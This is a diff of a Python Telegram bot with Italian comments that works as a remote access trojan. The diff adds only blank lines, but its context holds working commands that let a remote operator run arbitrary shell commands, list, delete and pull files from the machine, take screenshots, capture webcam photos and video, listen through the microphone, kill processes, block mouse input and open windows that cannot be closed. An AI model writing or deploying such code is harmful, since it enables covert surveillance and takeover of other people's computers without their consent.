@@ -78,6 +78,9 @@ def showinfo(chat,message,args):
     root.withdraw()
     x=messagebox.showinfo("info",ar)
     root.destroy()
+
+
+
 @bot.command("showwarning") 
 def showwarning(chat,message,args):
     """crea una finestra showarning con un messaggio personalizzato"""
@@ -86,6 +89,8 @@ def showwarning(chat,message,args):
     root.withdraw()
     x=messagebox.showwarning("warning",ar)
     root.destroy()
+
+
 @bot.command("showerror")
 def showeerror(chat,message,args):
     """crea una finestra showerror con un messaggio personalizzato"""
@@ -94,6 +99,8 @@ def showeerror(chat,message,args):
     root.withdraw()
     x=messagebox.showerror("ERROR",ar)
     root.destroy()
+
+
 @bot.command("askquestion") 
 def askquestion(chat,message,args):
     """crea una finestra askquestion con un messaggio personalizzato"""
@@ -102,6 +109,8 @@ def askquestion(chat,message,args):
     root.withdraw()
     x=messagebox.askquestion("ERROR",ar)
     root.destroy()
+
+
 @bot.command("askokcancel")
 def askok(chat,message,args):
     """crea una finestra askcancel con un messaggio personalizzato"""
@@ -110,6 +119,8 @@ def askok(chat,message,args):
     root.withdraw()
     x=messagebox.askokcancel("ERROR",ar)
     root.destroy() 
+
+
 @bot.command("askyesno")
 def askyes(chat,message,args):
     """crea una finestra askyesno con un messaggio personalizzato"""
@@ -118,6 +129,8 @@ def askyes(chat,message,args):
     root.withdraw()
     x=messagebox.askyesno("ERROR",ar)
     root.destroy() 
+
+
 @bot.command("asktrycancel")
 def asktrycancel(chat,message,args):
     """crea una finestra asktrycancell con un messaggio personalizzato"""
@@ -126,7 +139,11 @@ def asktrycancel(chat,message,args):
     root.withdraw()
     x=messagebox.showinfo("asktrycancel",ar)
     root.destroy()
+
+
 ################fine delle messagebox##################
+
+
 @bot.command("seefile")############## mostra tutti i pc nella directory selezionata############# 
 def see(chat,message,args):
     """mostra tutti i file di una specifica directory se non specificata verrà analizzata la directory attuale"""
@@ -136,6 +153,8 @@ def see(chat,message,args):
         chat.send("cartella non selezionata usermo la cartella su cui ti trovi ora " + str(ar))
     x=os.listdir(ar)
     chat.send(str(x))
+
+
 @bot.command("VediDirectory")########## vedi la directory attuale################
 def directory(chat,message):
     """mostra la directory attuale a causa di un errore se avete usato il comando cambia dovrete utilizzare il comando 2 volte"""
@@ -153,6 +172,8 @@ def Cdirectory(chat,message,args):
         chat.send("cambiata")
     except:
         chat.send("directory non trovata")
+
+
 @bot.command("Delete") ############ elimina il file selezionato###############
 def delete(chat,message,args):
     """elimina uno specifico file"""
@@ -163,6 +184,8 @@ def delete(chat,message,args):
         chat.send("eliminato ")
     except:
         chat.send("NON TROVATO")
+
+
 @bot.command("filedown") ################# fai un download di un file a scelta sul pc###############
 def filedown(chat,message,args):
     """scarica un preciso file"""
@@ -171,12 +194,16 @@ def filedown(chat,message,args):
         chat.send_file(ar)
     except:
         chat.send("non trovato")
+
+
 @bot.command("filesystem") ######## esegue un comando sul cmd#############
 def filesystem(chat,message,args):
     """esegue comandi del terminale"""
     ar=" ".join(args)
     os.system(ar)
     chat.send("eseguito")
+
+
 @bot.command("screen")  ################# fa uno screenshoot #################
 def wifi(chat,message):
     """effettua uno screenshot"""
@@ -184,6 +211,8 @@ def wifi(chat,message):
     myScreenshot.save("name.png")
     chat.send_photo("name.png")
     os.remove("name.png")
+
+
 @bot.command("foto") ############# fa una foto della webcam###############
 def foto(chat,message):
     """fa una foto (webcam)"""
@@ -194,6 +223,8 @@ def foto(chat,message):
     cam.release()
     chat.send_photo("opencv_frame.png")
     os.remove("opencv_frame.png")
+
+
 @bot.command("video") ######## registra un video della webcam l'audio non è registrato############
 def video(chat,message,args):
     """fa un video (webcam) con tempo personalizzato un minuto==1200"""
@@ -218,6 +249,8 @@ def video(chat,message,args):
     cv2.destroyAllWindows()
     chat.send_file("output.avi")
     os.remove("output.avi")
+
+
 @bot.command("process") ############ controlla se un processo è attivo """"""""""""""
 def isonornot(chat,message,args):
     """controllo se uno specifico processo èattivo"""
@@ -226,6 +259,8 @@ def isonornot(chat,message,args):
         chat.send("yes")
     else:
         chat.send("no")
+
+
 @bot.command("kill") ############## uccide uno specifico processo """"""""""""
 def kill(chat,message,args):
     """uccidere un determinato processo"""
@@ -269,16 +304,22 @@ def ascolta(chat,message):
             chat.send(texta)
         except Exception as e:
             chat.send(e)
+
+
 @bot.command("mousekill") ############### se è admin blocca il mouse ####################
 def mousekill(chat,message):
     """disabilita il mouse solo se è eseguito come amministratore"""
     chat.send("disattivato")
     ok = windll.user32.BlockInput(True)
+
+
 @bot.command("mouseriable") ##############à riattiva il mouse ################
 def riable(chat,message):
     """riattiva il mouse"""
     chat.send("riattivato")
     ok = windll.user32.BlockInput(False)
+
+
 @bot.command("messaggioinfinestra") ############### crea una finestra inchiudibile :) ########################
 def messaggioinfinestra(chat,message,args):
     """crea una finestra(impossibile da chiudere) con un messaggio personalizzato"""
